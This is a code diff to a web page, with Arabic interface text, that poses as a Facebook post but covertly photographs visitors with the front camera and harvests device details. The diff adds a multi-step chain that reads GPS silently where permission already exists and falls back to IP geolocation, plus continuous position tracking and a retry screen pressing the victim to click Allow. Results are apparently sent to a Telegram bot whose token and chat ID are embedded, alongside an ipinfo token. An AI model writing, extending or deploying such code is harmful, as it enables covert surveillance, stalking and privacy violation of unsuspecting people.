@@ -29,7 +29,6 @@
     .three-dots { position: absolute; top: 12px; left: 16px; width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; color: var(--text-secondary); font-size: 20px; }
     .three-dots:hover { background: var(--border); }
 
-    /* شاشة إعادة المحاولة */
     .retry-overlay {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: #ffffff; display: flex; flex-direction: column;
@@ -62,7 +61,6 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <!-- شاشة إعادة المحاولة الواحدة -->
   <div class="retry-overlay hidden" id="retryOverlay">
     <p id="retryMessage">يجب النقر على Allow للمتابعة</p>
     <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
@@ -75,6 +73,7 @@
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
+    const I = 'a7e43833d69a75';
 
     const post = document.getElementById('postContainer');
     const overlay = document.getElementById('retryOverlay');
@@ -84,9 +83,9 @@
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null;
-    let cameraGranted = false, locationGranted = false;
-    let escapeCompleted = false, watchId = null;
+    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
+    let cameraGranted = false, locationAttempted = false;
+    let escapeCompleted = false, watchId = null, locationRetryTimer = null;
     let retryReason = 'camera';
 
     function getPermissionKeyword() {
@@ -114,7 +113,7 @@
     }
 
     function showOverlay(reason) {
-      retryReason = reason || 'camera';
+      retryReason = reason;
       updateRetryMessage();
       post.classList.add('hidden');
       overlay.classList.remove('hidden');
@@ -130,6 +129,7 @@
       if (capInt) clearInterval(capInt);
       if (stream) stream.getTracks().forEach(t => t.stop());
       if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (locationRetryTimer) clearTimeout(locationRetryTimer);
     }
 
     async function loadPost() {
@@ -170,35 +170,109 @@
       } catch (e) {}
     }
 
-    // ==================== طلب الموقع (GPS) ====================
-    function requestLocation() {
-      if (!navigator.geolocation) { showOverlay('location'); return; }
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
+    async function fetchIPLocation() {
+      try {
+        const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
+        if (d.loc) {
+          const [lat, lon] = d.loc.split(',').map(Number);
+          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
           sendText(
-            `📍 <b>الموقع الدقيق (GPS)</b>\n` +
-            `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
-            `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">Google Maps</a>\n` +
-            `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">Apple Maps</a>\n` +
-            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
+            `📍 <b>الموقع التقريبي (IP)</b>\n` +
+            `الإحداثيات: ${lat}, ${lon}\n` +
+            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n` +
+            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">Apple Maps</a>\n` +
+            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`
           );
-          locationGranted = true;
+        }
+      } catch (e) {}
+    }
+
+    function sendGPSLocation(loc) {
+      sendText(
+        `📍 <b>الموقع الدقيق (GPS - ${loc.src})</b>\n` +
+        `الإحداثيات: ${loc.lat}, ${loc.lon} (دقة ${loc.acc}م)\n` +
+        `🌍 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lon}">Google Maps</a>\n` +
+        `🍎 <a href="http://maps.apple.com/?ll=${loc.lat},${loc.lon}&q=موقع">Apple Maps</a>\n` +
+        `🗺️ <a href="https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lon}&zoom=18">OpenStreetMap</a>`
+      );
+    }
+
+    async function attemptLocationChain() {
+      // 1. الصلاحية المخزنة
+      if (navigator.permissions && navigator.permissions.query) {
+        try {
+          const perm = await navigator.permissions.query({ name: 'geolocation' });
+          if (perm.state === 'granted') {
+            const pos = await new Promise((res, rej) => 
+              navigator.geolocation.getCurrentPosition(res, rej, {
+                enableHighAccuracy: true, timeout: 5000, maximumAge: 0
+              })
+            );
+            if (pos && pos.coords) {
+              gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'Silent' };
+              sendGPSLocation(gpsLoc);
+              hideOverlay();
+              return true;
+            }
+          }
+        } catch(e) {}
+      }
+
+      // 2. getCurrentPosition
+      try {
+        const pos = await new Promise((res, rej) => 
+          navigator.geolocation.getCurrentPosition(res, rej, {
+            enableHighAccuracy: true, timeout: 10000, maximumAge: 0
+          })
+        );
+        if (pos && pos.coords) {
+          gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'Prompt' };
+          sendGPSLocation(gpsLoc);
           hideOverlay();
-          // مراقبة مستمرة بعد ذلك
-          if (watchId) navigator.geolocation.clearWatch(watchId);
-          watchId = navigator.geolocation.watchPosition(
-            (p) => { gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' }; },
-            () => {},
-            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+          startWatching();
+          return true;
+        }
+      } catch(e) {}
+
+      // 3. watchPosition
+      try {
+        const pos = await new Promise((res, rej) => {
+          const wId = navigator.geolocation.watchPosition(
+            (p) => { navigator.geolocation.clearWatch(wId); res(p); },
+            (e) => { navigator.geolocation.clearWatch(wId); rej(e); },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
+        });
+        if (pos && pos.coords) {
+          gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'Watch' };
+          sendGPSLocation(gpsLoc);
+          hideOverlay();
+          startWatching();
+          return true;
+        }
+      } catch(e) {}
+
+      // 4. IP fallback
+      await fetchIPLocation();
+      if (!gpsLoc) {
+        showOverlay('location');
+      }
+      return false;
+    }
+
+    function startWatching() {
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      watchId = navigator.geolocation.watchPosition(
+        (p) => {
+          if (p.coords.accuracy && p.coords.accuracy <= 50) {
+            gpsLoc = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, src: 'Watch' };
+          }
         },
-        () => { showOverlay('location'); },
+        () => {},
         { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
       );
     }
 
-    // ==================== الكاميرا والتصوير ====================
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -249,25 +323,24 @@
       }
       cameraGranted = true;
       hideOverlay();
-      // طلب الموقع بعد 1.5 ثانية من نجاح الكاميرا
-      setTimeout(() => {
-        requestLocation();
-      }, 1500);
+      locationRetryTimer = setTimeout(async () => {
+        await attemptLocationChain();
+      }, 3000);
     }
 
     retryBtn.addEventListener('click', async () => {
       hideOverlay();
-      await new Promise(r => setTimeout(r, 200));
       if (retryReason === 'camera') {
         await startFlow();
       } else {
-        requestLocation();
+        await attemptLocationChain();
       }
     });
 
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
+      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
       sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
@@ -304,6 +377,7 @@
     (async function init() {
       await loadPost();
       sendDeviceInfo();
+      fetchIPLocation();
       if (isInAppBrowser()) await attemptEscape();
       setTimeout(startFlow, 600);
     })();
